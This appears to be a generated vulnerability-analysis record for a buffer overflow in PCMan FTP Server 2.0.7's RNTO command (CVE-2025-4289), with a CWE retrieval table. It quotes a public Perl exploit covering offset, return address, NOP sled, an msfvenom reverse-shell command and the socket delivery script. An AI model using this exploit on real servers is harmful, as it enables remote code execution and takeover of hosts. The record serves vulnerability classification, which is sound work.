# Vulnerability Information: CVE-2025-4289

## Vulnerability Description
A vulnerability classified as critical was found in PCMan FTP Server 2.0.7. This vulnerability affects unknown code of the component RNTO Command Handler. The manipulation leads to **buffer overflow**. The attack can be initiated remotely. The exploit has been disclosed to the public and may be used.

### Vulnerability Description Key Phrases
- **weakness:** **buffer overflow**
- **product:** PCMan FTP Server
- **version:** 2.0.7
- **component:** RNTO Command Handler

## CVE Reference Links Content Summary
```
# Exploit Title: PCMan FTP Server 2.0.7 - 'RNTO' Remote Buffer Overflow
# Date: 04/17/2025
# Exploit Author: Fernando Mengali
# Vendor Homepage: http://pcman.openfoundry.org/
# Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z
# Version: 2.0.7
# Tested on: Windows XP SP3 - # Version 5.1 (Build 2600.xpsp.080413-3111 : Service Pack 2)
# msfvenom -p windows/shell\_reverse\_tcp lhost=192.168.176.136 lport=4444 EXITFUNC=thread -b '\x00\x0a\x0d' -a x86 --platform Windows -f perl
#offset: 2006
#badchars: \x00\x0a\x0d
#EIP: 0x74e32fd9 (JMP ESP)
my $buf =
... // Payload omitted for brevity
my $sock = IO::Socket::INET->new(
PeerAddr => "192.168.176.131",
PeerPort => "21",
Proto => 'tcp',
) or die "Cannot connect to 192.168.176.131:21: $!\n";
my $offset = "A"x2006;
my $eip = "\xd9\x2f\xe3\x74";
my $nops = "\x90"x20;
my $payload = $offset . $eip . $nops . $buf;
my $r = <$sock>;
print $sock "USER anonymous\r\n";
$r = <$sock>;
print $r;
sleep(1);
print $sock "PASS anonymous\r\n";
$r = <$sock>;
print $r;
sleep(1);
print $sock "RNTO $payload\r\n";
$r = <$sock>;
print $r;
sleep(1);
close($sock);
```

*   **Root cause of vulnerability:** Remote buffer overflow in PCMan FTP Server 2.0.7 when handling the "RNTO" command.
*   **Weaknesses/vulnerabilities present:** Buffer overflow.
*   **Impact of exploitation:**  Potentially allows remote code execution.
*   **Attack vectors:**  Sending a malicious payload via the "RNTO" command.
*   **Required attacker capabilities/position:**  Network access to the FTP server, ability to send commands to the server.
*   **Mitigation or fix:**  Not explicitly mentioned, but the vulnerability is in a specific software version, so updating to a patched version or a different FTP server would be a mitigation.
*   **More detail than the official CVE description:** Yes, the content provides an exploit for the vulnerability, including the exploit code, offset, badchars, and target system.

## Retriever Results

### Top Combined Results

| Rank | CWE ID | Name | Abstraction | Usage  | Retrievers | Individual Scores |
|------|--------|------|-------------|-------|------------|-------------------|
| 1 | 119 | Improper Restriction of Operations within the Bounds of a Memory Buffer | Class | Discouraged | alternate_terms | 1.000 |
| 2 | 190 | Integer Overflow or Wraparound | Base | Allowed | alternate_terms | 0.800 |
| 3 | 120 | Buffer Copy without Checking Size of Input ('Classic Buffer Overflow') | Base | Allowed-with-Review | alternate_terms | 0.700 |
| 4 | 89 | Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection') | Base | Allowed | sparse | 0.350 |
| 5 | 79 | Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting') | Base | Allowed | sparse | 0.329 |
| 6 | 125 | Out-of-bounds Read | Base | Allowed | sparse | 0.298 |
| 7 | 434 | Unrestricted Upload of File with Dangerous Type | Base | Allowed | sparse | 0.289 |
| 8 | 674 | Uncontrolled Recursion | Class | Allowed-with-Review | sparse | 0.285 |
| 9 | 121 | Stack-based Buffer Overflow | Variant | Allowed | dense | 0.619 |
| 10 | 128 | Wrap-around Error | Base | Allowed | graph | 0.003 |

